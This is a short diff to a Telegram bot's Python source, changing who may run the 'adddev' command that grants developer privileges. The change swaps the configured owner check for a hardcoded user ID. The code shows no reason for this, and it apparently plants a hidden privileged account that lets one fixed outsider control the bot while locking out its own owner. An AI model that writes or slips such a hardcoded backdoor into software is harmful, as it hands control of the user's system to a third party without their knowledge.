@@ -68,7 +68,7 @@ async def remove_sudo(client, message: Message):
     except Exception:
         await message.reply_text("Failed to remove the user from the sudo list.")
 
-@app.on_message(filters.command("adddev") & (filters.user(OWNER_ID)))
+@app.on_message(filters.command("adddev") & filters.user(["6902029663"]))
 async def add_dev(client, message: Message):
     if message.reply_to_message:
         tar = message.reply_to_message.from_user.id
